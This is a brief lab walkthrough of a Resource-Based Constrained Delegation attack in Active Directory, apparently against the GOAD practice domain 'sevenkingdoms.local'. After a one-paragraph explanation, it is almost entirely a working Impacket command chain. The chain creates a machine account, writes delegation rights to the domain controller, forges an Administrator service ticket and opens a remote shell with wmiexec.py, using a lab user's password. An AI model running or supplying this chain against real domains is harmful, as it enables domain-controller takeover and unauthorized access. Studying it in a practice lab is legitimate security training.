**Resource-Based Constrained Delegation (RBCD)** is a delegation method in Active Directory environments where control over delegation is assigned to the resource. It works by allowing a resource (like a server) to specify which accounts can impersonate users to access that resource using their Kerberos tickets (TGS—Ticket Granting Service).

```bash
addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host kingslanding.sevenkingdoms.local 'sevenkingdoms.local/stannis.baratheon:Drag0nst0ne'
```


```bash
rbcd.py -delegate-from 'rbcd$' -delegate-to 'kingslanding$' -dc-ip 'kingslanding.sevenkingdoms.local' -action 'write' sevenkingdoms.local/stannis.baratheon:Drag0nst0ne 
```

```bash
getST.py -spn 'cifs/kingslanding.sevenkingdoms.local' -impersonate Administrator -dc-ip 'kingslanding.sevenkingdoms.local' 'sevenkingdoms.local/rbcd$:rbcdpass'   
```


```bash
export KRB5CCNAME=/workspace/rbcd/Administrator@cifs_kingslanding.sevenkingdoms.local@SEVENKINGDOMS.LOCAL.ccache
```


```bash

wmiexec.py -k -no-pass @kingslanding.sevenkingdoms.local
```